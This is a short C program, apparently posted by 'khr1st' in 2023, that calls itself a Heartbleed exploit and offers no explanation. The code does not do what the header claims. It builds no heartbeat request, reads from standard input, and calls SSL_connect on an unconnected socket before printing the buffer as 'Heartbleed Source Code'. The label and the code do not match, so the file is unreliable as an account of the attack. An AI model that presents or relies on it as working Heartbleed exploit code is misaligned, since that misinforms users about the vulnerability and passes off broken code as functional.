// =======================================================================>
//   Heartbleed by khr1st - 2023
//
//   no further explanation will be provided 
//
// =======================================================================>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

int main(int argc, char* argv[]) {
    SSL_CTX* ctx;
    SSL* ssl;
    BIO* sbio;
    char buf[1024];

    SSL_library_init();
    ctx = SSL_CTX_new(TLSv1_method());
    SSL_CTX_set_options(ctx, SSL_OP_NO_SSLv2);
    SSL_CTX_set_options(ctx, SSL_OP_NO_SSLv3);
    SSL_CTX_set_mode(ctx, SSL_MODE_AUTO_RETRY);

    sbio = BIO_new_socket(0, BIO_NOCLOSE);
    BIO_read(sbio, buf, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = '\0';

    ssl = SSL_new(ctx);
    SSL_set_bio(ssl, sbio, sbio);

    SSL_connect(ssl);
    SSL_write(ssl, buf, strlen(buf));
    SSL_read(ssl, buf, sizeof(buf) - 1);

    printf("Heartbleed Source Code:\n%s\n", buf);

    SSL_free(ssl);
    SSL_CTX_free(ctx);
    BIO_free_all(sbio);

    return 0;
}
